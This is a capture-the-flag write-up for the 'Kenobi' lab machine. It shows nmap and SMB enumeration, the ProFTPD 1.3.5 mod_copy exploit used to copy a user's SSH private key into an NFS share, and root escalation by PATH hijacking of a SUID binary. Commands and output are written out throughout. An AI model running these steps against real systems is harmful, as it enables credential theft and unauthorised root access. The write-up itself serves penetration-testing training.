# Kenobi Challenge Write Up

First We have to run nmap command to find all ports that open and what services are available:
``sudo nmap -sV -sC -oN nmap/initials 10.10.170.162``

open ports:
- 21 ftp
- 22 ssh
- 80 http
- 111 rpcbind
- 139/tcp netbios-ssn Samba smbd 3.X: 4.X
- 445/tcp netbios-ssn Samba smbd 4.3.11-Ubuntu
- 2049 nfs_acl     2-3 (RPC #100227)

Then let's search how many shares we could find
using ``nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.170.162 -oN nmap/smb_445``

result:
```bash
PORT    STATE SERVICE                                                                                                                     
445/tcp open  microsoft-ds                                                                                                                                                                                        
                                                                                                                                                                                                                  
Host script results:                                                                                                                                                                                              
| smb-enum-shares:                                                                                                                                                                           
|   account_used: guest
|   \\10.10.170.162\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.170.162\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.170.162\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

we found that we can login as anonymous, so let's do it:
```bash
smbclient //10.10.239.150/anonymous
```

There we can found **log.txt** file, let's back to our machine than use ``smbget`` to get the files in that directory
```bash
smbget -R smb://10.10.239.150/anonymous
```

Using nmap script ``nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.46.244``
we can see that there's a mount /var

Nest, let's search more information, there we can see that they using proFTPD for FTP server.
Let's connect it:
```bash
ftp 10.10.46.244 -p 21
Connected to 10.10.46.244.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.244]
```
They use proFTPF 1.3.5, it says that this service is vulenrable in the past. Using searchsploit, we can see what exploit might be usefull to attack this service.

The Vulnerability was on the mod_copy module, where we able to copy content from a driectory to another wihtout send to the client, and back to the remote directory. The culnerability was, that anybody could perform the SITE CPFR and SITE CPFTO with leveraged privillage. Lets copy kenobi private key to the mounted, and mount it on our local:
```bash
nc 10.10.46.244 21    
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.244]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

mkdir mounted_dir
sudo mount 10.10.46.244:/var mounted_dir
```

now we able to connect via ssh to the kenobi computer using his private key (id_rsa)
```bash
ssh -i id_rsa kenobi@10.10.46.244
```

Okay, now we're in the machine, what should we do next is laverage our privillage as root. let's find what cpmmand could we do as root?
```bash
sudo -l
```
```bash
find / -perm -u=s -type f 2>/dev/null
```
the result:
```bash
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

/usr/bin/menu is not usual, lets run the command:
```bash
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
```
weird program, but however, each has their own function. Let's see what commadn might be visible using strings command:
```bash
strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
```
seems that they run without specifying hte location such as /usr/bin/*, so we might able to change the command path location.
```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whomai
/bin/sh: 1: whomai: not found
# whoami
root
```
voila we get the root access.